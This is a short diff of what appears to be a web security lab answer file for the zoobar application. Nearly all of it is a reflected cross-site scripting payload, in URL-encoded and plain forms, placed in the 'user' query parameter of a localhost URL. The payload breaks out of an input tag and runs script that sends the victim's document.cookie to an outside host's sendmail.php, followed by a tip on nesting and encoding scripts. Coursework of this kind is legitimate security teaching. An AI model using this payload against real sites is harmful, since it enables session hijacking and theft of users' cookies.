@@ -1,8 +1,8 @@
-%22%3C%2Finput%3E%3Cscript%3Ejavascript%3Avoid((new%20Image()).src%3D%27http%3A%2F%2F192.168.76.130%2Fsendmail.php%3F%27%20%2B%20%27to%3D19930127zpf%40sjtu.edu.cn%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random())%3B%3C%2Fscript%3E%3Ca%20value%3D%22
+http://localhost:8080/zoobar/index.cgi/users?user=%22%3C%2Finput%3E%3Cscript%3Ejavascript%3Avoid((new%20Image()).src%3D%27http%3A%2F%2F192.168.76.130%2Fsendmail.php%3F%27%20%2B%20%27to%3D19930127zpf%40sjtu.edu.cn%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random())%3B%3C%2Fscript%3E%3Ca%20value%3D%22
 
 
 
-"</input><script>javascript:void((new Image()).src='http://192.168.76.130/sendmail.php?' + 'to=19930127zpf@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random());</script><a value="
+http://localhost:8080/zoobar/index.cgi/users?user="</input><script>javascript:void((new Image()).src='http://192.168.76.130/sendmail.php?' + 'to=19930127zpf@sjtu.edu.cn' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random());</script><a value="
 
 
 tip: just embed answer2's script in answer3's script. and encode it with:
